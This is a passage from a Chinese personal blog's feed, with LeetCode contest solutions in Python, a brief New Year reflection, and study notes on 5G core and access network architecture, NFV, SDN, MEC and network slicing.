颗小行星的质量。</span><br><span class="line">你可以按 任意顺序 重新安排小行星的顺序，然后让行星跟它们发生碰撞。如果行星碰撞时的质量 大于等于 小行星的质量，那么小行星被 摧毁 ，并且行星会 获得 这颗小行星的质量。否则，行星将被摧毁。</span><br><span class="line">如果所有小行星 都 能被摧毁，请返回 true ，否则返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：mass = 10, asteroids = [3,9,19,5,21]</span><br><span class="line">输出：true</span><br><span class="line">解释：一种安排小行星的方式为 [9,19,5,3,21] ：</span><br><span class="line">- 行星与质量为 9 的小行星碰撞。新的行星质量为：10 + 9 = 19</span><br><span class="line">- 行星与质量为 19 的小行星碰撞。新的行星质量为：19 + 19 = 38</span><br><span class="line">- 行星与质量为 5 的小行星碰撞。新的行星质量为：38 + 5 = 43</span><br><span class="line">- 行星与质量为 3 的小行星碰撞。新的行星质量为：43 + 3 = 46</span><br><span class="line">- 行星与质量为 21 的小行星碰撞。新的行星质量为：46 + 21 = 67</span><br><span class="line">所有小行星都被摧毁。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：mass = 5, asteroids = [4,9,23,4]</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">行星无论如何没法获得足够质量去摧毁质量为 23 的小行星。</span><br><span class="line">行星把别的小行星摧毁后，质量为 5 + 4 + 9 + 4 = 22 。</span><br><span class="line">它比 23 小，所以无法摧毁最后一颗小行星。</span><br></pre></td></tr></table></figure><p>这道题我们使用贪心的做法，每次撞击行星的时候总是从最小的那个撞起。因此质量肯定可以累加。这里我们不用从最小的开始撞，从不超过mass值的最大值开始向后计算。因此我们首先需要对asteroids进行排序，找到初始mass应该插入的位置。如果插入位置为0的话，则证明初始mass的值不足以撞击任何行星，直接返回false即可。如果插入位置不为0，则依次向后判断，更新mass的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">asteroidsDestroyed</span><span class="params">(self, mass, asteroids)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type mass: int</span></span><br><span class="line"><span class="string">        :type asteroids: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#对行星大小排序</span></span><br><span class="line">        asteroids = sorted(asteroids)</span><br><span class="line">        <span class="comment">#找到mass在行星中的插入位置</span></span><br><span class="line">        insert = bisect.bisect(asteroids,mass)</span><br><span class="line">        <span class="comment">#如果插入位置是0，说明mass无法和任何行星碰撞，直接返回false</span></span><br><span class="line">        <span class="keyword">if</span> insert == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#如果插入位置不是0，则mass的最大质量是插入位置之前所有行星质量之和加上mass的初始质量</span></span><br><span class="line">        mass = sum(asteroids[:insert])+mass</span><br><span class="line">        <span class="comment">#从mass插入位置之后开始遍历，判断当前mass质量是否小于当前行星质量</span></span><br><span class="line">        <span class="comment">#如果小于直接返回false</span></span><br><span class="line">        <span class="comment">#如果大于则更新mass的质量</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(insert,len(asteroids)):</span><br><span class="line">            <span class="keyword">if</span> mass &lt; asteroids[i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mass += asteroids[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="参加会议的最多员工数"><a href="#参加会议的最多员工数" class="headerlink" title="参加会议的最多员工数"></a>参加会议的最多员工数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个公司准备组织一场会议，邀请名单上有 n 位员工。公司准备了一张 圆形 的桌子，可以坐下 任意数目 的员工。</span><br><span class="line">员工编号为 0 到 n - 1 。每位员工都有一位 喜欢 的员工，每位员工 当且仅当 他被安排在喜欢员工的旁边，他才会参加会议。每位员工喜欢的员工 不会 是他自己。</span><br><span class="line">给你一个下标从 0 开始的整数数组 favorite ，其中 favorite[i] 表示第 i 位员工喜欢的员工。请你返回参加会议的 最多员工数目 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [2,2,1,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">上图展示了公司邀请员工 0，1 和 2 参加会议以及他们在圆桌上的座位。</span><br><span class="line">没办法邀请所有员工参与会议，因为员工 2 没办法同时坐在 0，1 和 3 员工的旁边。</span><br><span class="line">注意，公司也可以邀请员工 1，2 和 3 参加会议。</span><br><span class="line">所以最多参加会议的员工数目为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [1,2,0]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">每个员工都至少是另一个员工喜欢的员工。所以公司邀请他们所有人参加会议的前提是所有人都参加了会议。</span><br><span class="line">座位安排同图 1 所示：</span><br><span class="line">- 员工 0 坐在员工 2 和 1 之间。</span><br><span class="line">- 员工 1 坐在员工 0 和 2 之间。</span><br><span class="line">- 员工 2 坐在员工 1 和 0 之间。</span><br><span class="line">参与会议的最多员工数目为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：favorite = [3,0,1,4,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">上图展示了公司可以邀请员工 0，1，3 和 4 参加会议以及他们在圆桌上的座位。</span><br><span class="line">员工 2 无法参加，因为他喜欢的员工 0 旁边的座位已经被占领了。</span><br><span class="line">所以公司只能不邀请员工 2 。</span><br><span class="line">参加会议的最多员工数目为 4 。</span><br></pre></td></tr></table></figure><p>一脸懵逼，等一手题解</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;老三样如约而至。。。。&lt;/p&gt;
&lt;h4 id=&quot;检查是否所有-A-都在-B-之前&quot;&gt;&lt;a href=&quot;#检查是否所有-A-都在-B-之前&quot; 
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>辞旧迎新</title>
    <link href="elssm.github.io/2022/01/01/%E8%BE%9E%E6%97%A7%E8%BF%8E%E6%96%B0/"/>
    <id>elssm.github.io/2022/01/01/辞旧迎新/</id>
    <published>2022-01-01T03:35:26.000Z</published>
    <updated>2022-01-19T14:57:21.777Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>2022年第一天。。。</p><p>万万没想到今年跨年我也是在昆明度过。</p><p>如果不是因为疫情的话，此时的我应该在西安。</p><h4 id="回想"><a href="#回想" class="headerlink" title="回想"></a>回想</h4><p>回想2021年，匆匆忙忙度过。</p><p>读了一些书，去了一些地方，认识了一些人，学了一些东西。</p><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>新的一年。</p><p>希望家人朋友身体健康！</p><p>希望秋招有一个好的结果！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;2022年第一天。。。&lt;/p&gt;
&lt;p&gt;万万没想到今年跨年我也是在昆明度过。&lt;/p&gt;
&lt;p&gt;如果不是因为疫情的话，此时的我应该在西安。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="随想" scheme="elssm.github.io/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>5G基础学习</title>
    <link href="elssm.github.io/2021/12/31/5G%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/12/31/5G基础学习/</id>
    <published>2021-12-31T02:58:21.000Z</published>
    <updated>2022-01-04T07:39:38.754Z</updated>
    
    <content type="html"><![CDATA[<h4 id="5G介绍"><a href="#5G介绍" class="headerlink" title="5G介绍"></a>5G介绍</h4><p>5G 是指第五代移动网络。它旨在扩展现有的 4G LTE 蜂窝网络，甚至完全取代它们。每一代技术都是由几个因素决定的，例如所使用的技术、发送与接收信号之间的时间间隔（延迟），以及通过网络向所连设备传输数据的速度。5G 网络有望实现千兆级的速度。同时，5G 服务还大大缩短了延迟，并可将覆盖范围扩展到偏远地区。 </p><p><a href="https://www.keysight.com/cn/zh/assets/7018-06171/brochures/5992-2996.pdf" target="_blank" rel="noopener">5G常用属于及缩略语</a></p><h4 id="5G应用场景"><a href="#5G应用场景" class="headerlink" title="5G应用场景"></a>5G应用场景</h4><h5 id="eMBB"><a href="#eMBB" class="headerlink" title="eMBB"></a>eMBB</h5><p>“增强移动宽带”。就是以人为中心的应用场景，集中表现为超高的传输数据速率，广覆盖下的移动性保证等，这是最直观改善移动网速，未来更多的应用对移动网速的需求都将得到满足，从 eMBB 层面上来说， 它是原来移动网络的升级，让人们体验到极致的网速。因此，增强移动宽带（eMBB）将是 5G 发展初期面向个人消费市场的核心应用场景。</p><h5 id="uRLLC"><a href="#uRLLC" class="headerlink" title="uRLLC"></a>uRLLC</h5><p>“高可靠低时延连接”。在此场景下，连接时延要达到 1ms 级别，而且要支持高速移动（500KM/H）情况下的高可靠性（99.999%）连接。这一场景更多面向车联网、工业控制、远程医疗等特殊应用，这类应用在未来潜在的价值极高，未来社会走向智能化，就得依靠这个场景得网络，这些应用的安全性、可靠性要求极高。</p><h5 id="mMTC"><a href="#mMTC" class="headerlink" title="mMTC"></a>mMTC</h5><p>“大规模机器类型通信”，5G 强大的连接能力可以快速促进各垂直行业（智慧城市、智能家居、环境监测等）的深度融合。万物互联下，人们的生活方式也将发生颠覆性的变化。这一场景下，数据速率较低且时延不敏感，连接覆盖生活的方方面面，终端成本更低，电池寿命更长且可靠性更高，真正能实现万物互联。</p><p>如下图所示为5G不同应用场景的需求指标差异</p><p><img src="/2021/12/31/5G基础学习/1.png" alt="1"></p><h4 id="5G网络架构"><a href="#5G网络架构" class="headerlink" title="5G网络架构"></a>5G网络架构</h4><p>针对于上述的三大应用场景，单一的网络很难满足三种网络需求，因此我们可以设置三种网络分别是<code>5G-eMBB</code>网络、<code>5G-uRLLC</code>网络、<code>5G-mMTC</code>网络。这是一种解决办法，但是这样做的成本太高，非常不划算。因此这也成为了5G时代的一种挑战。</p><p><img src="/2021/12/31/5G基础学习/2.png" alt="2"></p><h5 id="基于服务的架构SBA"><a href="#基于服务的架构SBA" class="headerlink" title="基于服务的架构SBA"></a>基于服务的架构SBA</h5><p><img src="/2021/12/31/5G基础学习/3.png" alt="3"></p><p>AMF(Access and Mobility Management Function)：接入和移动性管理功能，类似于4G的MME</p><ul><li>终止RAN CP接口(N2)</li><li>终止NAS(N1)，NAS加密和完整性保护</li><li>注册、连接、可达性和流动性管理</li><li>合法拦截</li><li>为UE和SMF之间的SM消息提供传输</li><li>用于路由SM消息的透明代理</li><li>接入身份验证和接入授权</li></ul><p>SMF(The Session Management Function)：会话管理功能，类似于4G的PGW</p><ul><li>负责与分离的数据面交互，创建、更新和删除PDU会话</li><li>管理与UPF的会话环境</li><li>负责DHCP服务器和IP地址管理系统的功能</li></ul><p>UPF(The User plane Function)：用户面功能</p><ul><li>终端和外部数据的传输</li><li>数据包的路由转发</li><li>应用数据传输的策略</li><li>处理QOS相关功能</li></ul><p>PCF(The Policy Control Function)：策略控制功能</p><ul><li>给整个网络提供配置</li><li>通过访问用户数据库转发策略信息</li></ul><p>NEF(The Network Exposure Function)：网络开放功能</p><ul><li>给外部用户提供一些特定的服务</li></ul><p>NRF(The Network Repository Function)：网络存储库功能</p><ul><li>支持服务发现</li></ul><p>UDM(The Unified Data Management)：统一数据管理</p><ul><li>生成鉴权信息</li></ul><p>AUSF(The Authentication Server Function)：鉴权服务功能</p><ul><li>提供鉴权和接入</li></ul><p>AF(The Application Function)：应用功能</p><ul><li>提供上层的应用功能</li></ul><p>UDR(The Unified Data Repository)：统一数据存储库</p><ul><li>通过UDM来提取存储签约数据</li><li>通过PCF提取存储策略数据</li><li>存储一些结构化的数据</li></ul><p>UDFS(The Unstructured Data Storage Function)：非结构化数据存储功能</p><ul><li>存储一些非结构化的数据</li></ul><p>SMSF(The Short Message Service Function)：短消息服务功能</p><ul><li>短信管理，签约信息管理</li></ul><p>NSSF(The Network Slice Selection function)：网络切片选择功能</p><ul><li>根据UE提供的信息管理特定的网络切片</li></ul><p>5G-EIR(The 5G-Equipment Identity Register)：5G设备认证中心</p><ul><li>检查设备状态</li></ul><p>LMF(The Location Management Function)：位置管理功能</p><ul><li>支持定位相关功能的管理</li></ul><p>SEPP(The Security Edge Protection Proxy)：安全边缘保护代理</p><ul><li>规则定义，数据包过滤</li></ul><p>NWDAF(The Network Data Analytics Function)：网络数据分析功能</p><ul><li>提供基于网络切片的网络数据分析</li></ul><h5 id="网络功能服务框架"><a href="#网络功能服务框架" class="headerlink" title="网络功能服务框架"></a>网络功能服务框架</h5><h5 id="交互机制"><a href="#交互机制" class="headerlink" title="交互机制"></a>交互机制</h5><p>服务使用者和服务提供者之间的交互基于两种机制，分别是</p><ul><li>请求响应机制</li><li>订阅通知机制</li></ul><p><img src="/2021/12/31/5G基础学习/4.png" alt="4"></p><h5 id="注册、发现、授权机制"><a href="#注册、发现、授权机制" class="headerlink" title="注册、发现、授权机制"></a>注册、发现、授权机制</h5><p>服务提供者在上线之后会进行注册，注册通过发送消息给NRF。注册之后，NRF中会存储现在的一个状态服务信息，后续假如有其他服务的使用者想使用这个服务。如下图所示，PCF想使用AMF服务的功能，那么PCF首先会给NRF发送一个服务发现消息。查询NRF中是否存有AMF服务信息，如果有的话，NRF会对PCF进行鉴权，之后PCF会获得AMF的相关服务信息，之后就可以使用请求响应机制来获取AMF相关的服务。</p><p><img src="/2021/12/31/5G基础学习/5.png" alt="5"></p><h5 id="SBI接口协议"><a href="#SBI接口协议" class="headerlink" title="SBI接口协议"></a>SBI接口协议</h5><p><img src="/2021/12/31/5G基础学习/6.png" alt="6"></p><h5 id="5G核心网与EPC交互"><a href="#5G核心网与EPC交互" class="headerlink" title="5G核心网与EPC交互"></a>5G核心网与EPC交互</h5><p><img src="/2021/12/31/5G基础学习/7.png" alt="7"></p><h5 id="5G接入网架构"><a href="#5G接入网架构" class="headerlink" title="5G接入网架构"></a>5G接入网架构</h5><p><img src="/2021/12/31/5G基础学习/8.png" alt="8"></p><h5 id="5G和4G接入网对比"><a href="#5G和4G接入网对比" class="headerlink" title="5G和4G接入网对比"></a>5G和4G接入网对比</h5><p><img src="/2021/12/31/5G基础学习/9.png" alt="9"></p><h5 id="5G接入网CU-DU"><a href="#5G接入网CU-DU" class="headerlink" title="5G接入网CU/DU"></a>5G接入网CU/DU</h5><p><img src="/2021/12/31/5G基础学习/10.png" alt="10"></p><p>可以看到，在CU中又划分为用户面和控制面，之间通过E1接口来连接。从而形成了控制面<code>CU-CP</code>和用户面<code>CU-UP</code>。分离的好处一是可以进行集中化的控制，二是可以灵活的部署。</p><p>这里需要注意的是，一个DU只能连接到一个<code>CU-CP</code>，一个<code>CU-UP</code>也只能连接到一个<code>CU-CP</code>，一个DU可以连接到一个<code>CU-CP</code>控制下的多个<code>CU-UP</code>，一个<code>CU-UP</code>可以连接到一个<code>CU-CP</code>控制下的多个DU。</p><h5 id="5G网络部署选项"><a href="#5G网络部署选项" class="headerlink" title="5G网络部署选项"></a>5G网络部署选项</h5><p><img src="/2021/12/31/5G基础学习/11.png" alt="11"></p><p><img src="/2021/12/31/5G基础学习/12.png" alt="12"></p><p><img src="/2021/12/31/5G基础学习/13.png" alt="13"></p><h4 id="5G关键技术"><a href="#5G关键技术" class="headerlink" title="5G关键技术"></a>5G关键技术</h4><p><img src="/2021/12/31/5G基础学习/14.png" alt="14"></p><h5 id="NFV-网络功能虚拟化"><a href="#NFV-网络功能虚拟化" class="headerlink" title="NFV(网络功能虚拟化)"></a>NFV(网络功能虚拟化)</h5><p>NFV技术是一种将网络功能整合到行业标准的服务器、交换机和存储硬件上，并且提供优化的虚拟化数据平面，可通过服务器上运行的软件让管理员取代传统物理网络设备的技术。</p><p>NFV实现了软硬件的解耦，如下图所示</p><p><img src="/2021/12/31/5G基础学习/15.png" alt="15"></p><h6 id="NFV的好处"><a href="#NFV的好处" class="headerlink" title="NFV的好处"></a>NFV的好处</h6><ul><li>成本低</li><li>灵活性高</li><li>部署快</li><li>开放性高</li><li>配置简单</li></ul><h6 id="NFV架构"><a href="#NFV架构" class="headerlink" title="NFV架构"></a>NFV架构</h6><p><img src="/2021/12/31/5G基础学习/16.png" alt="16"></p><ul><li>VNF(Virtualized Network Function)：虚拟化的网络功能</li><li>EM(Element Management)：网元管理功能</li><li>Hardware Resources：硬件资源</li><li>Virtualisation Layer and Virtualised Resources：虚拟化层及虚拟资源</li><li>VIM(Virtualised infrastructure Managers)：虚拟化基础设施管理器</li><li>VNFM(VNF Managers)：虚拟化网络功能管理器</li><li>NFVO(NFV Orchestrator)：网络功能虚拟化编排器</li></ul><h6 id="NFV集成方式"><a href="#NFV集成方式" class="headerlink" title="NFV集成方式"></a>NFV集成方式</h6><p><img src="/2021/12/31/5G基础学习/17.png" alt="17"></p><p>NFV带来的挑战</p><p><img src="/2021/12/31/5G基础学习/18.png" alt="18"></p><h5 id="SDN-软件定义网络"><a href="#SDN-软件定义网络" class="headerlink" title="SDN(软件定义网络)"></a>SDN(软件定义网络)</h5><p>SDN的设计思路其实和NFV一样，都是通过解耦来实现系统灵活性的提升。NFV是软硬件解耦，而SDN是控制平面和转发平面解耦。传统网络中，各个转发节点（例如路由器、交换机）都是独立工作的，内部管理命令和接口也是厂商私有的，不对外开放。而SDN网络，就是在网络之上建立了一个SDN控制器节点，统一管理和控制下层设备的数据转发。所有的下级节点，管理功能被剥离（交给了SDN控制器），只剩下转发功能。如下图对比所示</p><p><img src="/2021/12/31/5G基础学习/19.png" alt="19"></p><h6 id="SDN架构"><a href="#SDN架构" class="headerlink" title="SDN架构"></a>SDN架构</h6><p><img src="/2021/12/31/5G基础学习/20.png" alt="20"></p><p>最底层是基础设施层，专注于数据和业务转发。中间层是控制层，集中管理网络设备，将整个网络虚拟化成一种资源池，根据用户需求灵活分配资源。最上层是应用层，可以根据各种API接口对底层设备进行编程，从而开发各种业务应用。</p><h6 id="SDN应用场景"><a href="#SDN应用场景" class="headerlink" title="SDN应用场景"></a>SDN应用场景</h6><p>核心网SDN化</p><ul><li>提升转发性能</li><li>提升网络可靠性</li><li>促进网络扁平化部署</li><li>提升业务创新能力</li></ul><h5 id="SDN与NFV的关系"><a href="#SDN与NFV的关系" class="headerlink" title="SDN与NFV的关系"></a>SDN与NFV的关系</h5><p><img src="/2021/12/31/5G基础学习/21.png" alt="21"></p><h5 id="MEC-移动边缘计算"><a href="#MEC-移动边缘计算" class="headerlink" title="MEC(移动边缘计算)"></a>MEC(移动边缘计算)</h5><p>MEC的基本思想是把云计算平台从移动核心网络内部迁移到移动接入网边缘，通过部署具备计算、存 储、通信等功能的边缘节点，使传统无线接入网具备业务本地化条件，进一步为终端用户提供更高带宽、更低时延的数据服务，并大幅度减少核心网的网络负荷，同时降低数据业务对网络回传的带宽要求。</p><h6 id="MEC实现方式"><a href="#MEC实现方式" class="headerlink" title="MEC实现方式"></a>MEC实现方式</h6><p><img src="/2021/12/31/5G基础学习/22.png" alt="22"></p><p>传统的网络应用终端要通过核心网去连接，从终端到核心网到基站再到应用。引入边缘计算是通过在靠近接入网的位置加入MEC功能。其中MEC中包括接入网的CU，UPF和边缘计算的APP。因此我们可以通过边缘计算访问到我们需要的APP，可以提高用户的访问速度。因为5G采用的是SBA架构，将用户面和控制面彻底分离，因此用户面的功能完全是由UPF控制的，所以UPF可以和接入网一起部署在靠近用户的无线接入网的地方，配合MEC独立使用。</p><h6 id="MEC架构"><a href="#MEC架构" class="headerlink" title="MEC架构"></a>MEC架构</h6><p><img src="/2021/12/31/5G基础学习/23.png" alt="23"></p><h6 id="MEC部署方式"><a href="#MEC部署方式" class="headerlink" title="MEC部署方式"></a>MEC部署方式</h6><p><img src="/2021/12/31/5G基础学习/24.png" alt="24"></p><h6 id="MEC应用场景"><a href="#MEC应用场景" class="headerlink" title="MEC应用场景"></a>MEC应用场景</h6><ul><li>本地分流<ul><li>企业园区</li><li>校园</li><li>本地视频监控</li><li>VR/AR</li><li>本地视频直播</li><li>边缘CDN</li></ul></li><li>数据服务<ul><li>室内定位</li><li>车联网</li></ul></li><li>业务优化<ul><li>视频QoS优化</li><li>视频直播和游戏加速</li></ul></li></ul><h5 id="NS-网络切片"><a href="#NS-网络切片" class="headerlink" title="NS(网络切片)"></a>NS(网络切片)</h5><p>一个5G网络切片是一组网络功能，运行这些网络功能的资源以及这些网络功能特定的配置所组成的集合，这些网络功能及其相应的配置形成一个完整的逻辑网络，这个逻辑网络包含满足特定业务所需要的网络特征，为此特定的业务场景提供相应的网络服务。</p><p>网络切片的优势</p><p>网络切片允许共享同一基础设施的运营者为切片配置网络以及定义具体功能，并且可以根据运营者的策略通过SDN、NFV灵活地动态创造以及撤销切片。这样可以灵活地管理网络资源，通过只提供必要的网络资源以满足服务需求来极大的提高网络资源的利用率。</p><h6 id="端到端网络切片的实现"><a href="#端到端网络切片的实现" class="headerlink" title="端到端网络切片的实现"></a>端到端网络切片的实现</h6><p><img src="/2021/12/31/5G基础学习/25.png" alt="25"></p><h6 id="核心网切片"><a href="#核心网切片" class="headerlink" title="核心网切片"></a>核心网切片</h6><p><img src="/2021/12/31/5G基础学习/26.png" alt="26"></p><p><img src="/2021/12/31/5G基础学习/27.png" alt="27"></p><p><img src="/2021/12/31/5G基础学习/28.png" alt="28"></p><h6 id="核心网切片选择"><a href="#核心网切片选择" class="headerlink" title="核心网切片选择"></a>核心网切片选择</h6><p><img src="/2021/12/31/5G基础学习/29.png" alt="29"></p><h6 id="传输网切片"><a href="#传输网切片" class="headerlink" title="传输网切片"></a>传输网切片</h6><p><img src="/2021/12/31/5G基础学习/30.png" alt="30"></p><h6 id="接入网切片"><a href="#接入网切片" class="headerlink" title="接入网切片"></a>接入网切片</h6><p><img src="/2021/12/31/5G基础学习/31.png" alt="31"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;5G介绍&quot;&gt;&lt;a href=&quot;#5G介绍&quot; class=&quot;headerlink&quot; title=&quot;5G介绍&quot;&gt;&lt;/a&gt;5G介绍&lt;/h4&gt;&lt;p&gt;5G 是指第五代移动网络。它旨在扩展现有的 4G LTE 蜂窝网络，甚至完全取代它们。每一代技术都是由几个因素决定的，例如所
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第273场周赛write up</title>
    <link href="elssm.github.io/2021/12/26/Leetcode%E7%AC%AC273%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2021/12/26/Leetcode第273场周赛write-up/</id>
    <published>2021-12-26T08:12:20.000Z</published>
    <updated>2021-12-26T09:00:20.422Z</updated>
    
    <content type="html"><![CDATA[<h4 id="反转两次的数字"><a href="#反转两次的数字" class="headerlink" title="反转两次的数字"></a>反转两次的数字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反转 一个整数意味着倒置它的所有位。</span><br><span class="line">例如，反转 2021 得到 1202 。反转 12300 得到 321 ，不保留前导零 。</span><br><span class="line">给你一个整数 num ，反转 num 得到 reversed1 ，接着反转 reversed1 得到 reversed2 。如果 reversed2 等于 num ，返回 true ；否则，返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：num = 526</span><br><span class="line">输出：true</span><br><span class="line">解释：反转 num 得到 625 ，接着反转 625 得到 526 ，等于 num 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：num = 1800</span><br><span class="line">输出：false</span><br><span class="line">解释：反转 num 得到 81 ，接着反转 81 得到 18 ，不等于 num 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：num = 0</span><br><span class="line">输出：true</span><br><span class="line">解释：反转 num 得到 0 ，接着反转 0 得到 0 ，等于 num 。</span><br></pre></td></tr></table></figure><p>这道题分两种情况，最后一位是0和最后一位不是0。</p><p>如果最后一位是不是0，直接返回True</p><p>如果最后一位是0，分这个数是0还是其他数字。如果这个数是0，直接回返True，如果这个数不是0，直接返回False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSameAfterReversals</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> num%<span class="number">10</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="执行所有后缀指令"><a href="#执行所有后缀指令" class="headerlink" title="执行所有后缀指令"></a>执行所有后缀指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">现有一个 n x n 大小的网格，左上角单元格坐标 (0, 0) ，右下角单元格坐标 (n - 1, n - 1) 。给你整数 n 和一个整数数组 startPos ，其中 startPos = [startrow, startcol] 表示机器人最开始在坐标为 (startrow, startcol) 的单元格上。</span><br><span class="line">另给你一个长度为 m 、下标从 0 开始的字符串 s ，其中 s[i] 是对机器人的第 i 条指令：&apos;L&apos;（向左移动），&apos;R&apos;（向右移动），&apos;U&apos;（向上移动）和 &apos;D&apos;（向下移动）。</span><br><span class="line">机器人可以从 s 中的任一第 i 条指令开始执行。它将会逐条执行指令直到 s 的末尾，但在满足下述条件之一时，机器人将会停止：</span><br><span class="line">下一条指令将会导致机器人移动到网格外。</span><br><span class="line">没有指令可以执行。</span><br><span class="line">返回一个长度为 m 的数组 answer ，其中 answer[i] 是机器人从第 i 条指令 开始 ，可以执行的指令数目。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 